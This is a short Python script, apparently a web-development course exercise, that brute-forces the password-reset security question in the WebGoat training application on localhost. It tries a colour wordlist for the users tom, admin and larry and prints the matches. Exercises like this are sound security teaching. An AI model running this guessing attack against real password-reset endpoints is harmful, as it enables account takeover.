#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests


# ---------------------------------------------------------------------
# Program: Full Stack Web Development
# Author: Feng Li
# Course: WEBD-3010 (273793) Web Development 3
# Created: 2025-10-15
# ---------------------------------------------------------------------
def main():
    url = "http://127.0.0.1:8080/WebGoat/PasswordReset/questions"
    header = {
        "host": "localhost:8080",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:144.0) Gecko/20100101 Firefox/144.0",
        "Accept": "*/*",
        "Accept-Language": "en-CA,en-US;q=0.7,en;q=0.3",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Length": "37",
        "Origin": "https://localhost:8080",
        "Connection": "keep-alive",
        "Referer": "https://localhost:8080/WebGoat/start.mvc",
        "Cookie": "JSESSIONID=BGFhSmDP3hGWA5sATknu5RHk3PBhQjUhEso-y5vP;WEBWOLFSESSION=lJ58vg5kQf7aXM9iAE2miblvkHscPZpBQ7cL1fRO",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0"
    }

    for i in usernames:
        for j in colors:
            params = "username=" + i.lower() + "&securityQuestion=" + j.lower();
            response = requests.post(url=url, headers=header, data=params)
            if response.json()['lessonCompleted']:
                print ("Username: " + i)
                print ("Color: " + j + "\n")

if __name__ =="__main__":
    usernames = ['tom', 'admin', 'larry']
    with open('colors.txt', 'r') as f:
        colors = [i.rstrip('\n') for i in f]
    main()